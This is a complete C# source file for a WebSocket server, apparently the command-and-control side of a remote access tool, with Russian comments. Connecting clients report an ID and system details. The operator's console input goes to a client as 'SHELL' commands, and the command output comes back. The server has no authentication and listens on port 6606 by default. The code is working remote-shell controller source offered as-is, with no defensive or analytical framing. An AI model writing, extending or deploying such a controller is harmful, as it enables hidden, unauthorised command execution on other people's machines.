// language: C#, file: Program.cs, project: SosokServer
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace SosokServer
{
    public class Packet
    {
        public string Type { get; set; } = "";
        public string Action { get; set; } = "";
        public string Payload { get; set; } = "";
        public string ClientId { get; set; } = "";

        public string Serialize() => JsonSerializer.Serialize(this);
        public static Packet? Deserialize(string json) => JsonSerializer.Deserialize<Packet>(json);
    }

    class Program
    {
        static Dictionary<string, WebSocketHandler> _clients = new();

        static async Task Main(string[] args)
        {
            int port = int.Parse(Environment.GetEnvironmentVariable("PORT") ?? "6606");
            string prefix = $"http://*:{port}/";

            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(prefix);
            listener.Start();
            Console.WriteLine($"=== WS СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port} ===");

            _ = Task.Run(ReadConsoleCommands);

            while (true)
            {
                var context = await listener.GetContextAsync();
                if (context.Request.IsWebSocketRequest)
                {
                    _ = Task.Run(() => HandleClient(context));
                }
                else
                {
                    context.Response.StatusCode = 400;
                    context.Response.Close();
                }
            }
        }

        private static async Task HandleClient(HttpListenerContext context)
        {
            var wsContext = await context.AcceptWebSocketAsync(null);
            var ws = wsContext.WebSocket;
            var handler = new WebSocketHandler(ws);

            var buffer = new byte[4096];
            try
            {
                while (ws.State == System.Net.WebSockets.WebSocketState.Open)
                {
                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), System.Threading.CancellationToken.None);
                    if (result.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;

                    string json = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    var packet = Packet.Deserialize(json);

                    if (packet == null) continue;

                    if (packet.Type == "INFO")
                    {
                        _clients[packet.ClientId] = handler;
                        Console.WriteLine($"\n[+] Подключился: {packet.ClientId} | {packet.Payload}\n> ");
                    }
                    else if (packet.Type == "RESP")
                    {
                        Console.WriteLine($"\n[{packet.ClientId}] {packet.Action}:\n{packet.Payload}\n> ");
                    }
                }
            }
            catch { Console.WriteLine("\n[-] Отключился.\n> "); }
            finally { ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "", System.Threading.CancellationToken.None); }
        }

        private static async Task ReadConsoleCommands()
        {
            while (true)
            {
                Console.Write("> ");
                string? input = Console.ReadLine();

                // КРИТИЧЕСКИЙ ФИКС: Если ввода нет (Render), не уходим в бесконечный цикл
                if (input == null)
                {
                    await Task.Delay(1000);
                    continue;
                }

                if (string.IsNullOrWhiteSpace(input)) continue;

                if (_clients.Count == 0)
                {
                    continue; // Не спамим в логи, просто ждем
                }

                var target = _clients.Values.First();
                var packet = new Packet { Type = "CMD", Action = "SHELL", Payload = input };
                await target.SendAsync(packet);
            }
        }
    }

    public class WebSocketHandler
    {
        private System.Net.WebSockets.WebSocket _ws;
        public WebSocketHandler(System.Net.WebSockets.WebSocket ws) { _ws = ws; }

        public async Task SendAsync(Packet packet)
        {
            string json = packet.Serialize();
            byte[] data = Encoding.UTF8.GetBytes(json);
            await _ws.SendAsync(new ArraySegment<byte>(data), System.Net.WebSockets.WebSocketMessageType.Text, true, System.Threading.CancellationToken.None);
        }
    }
}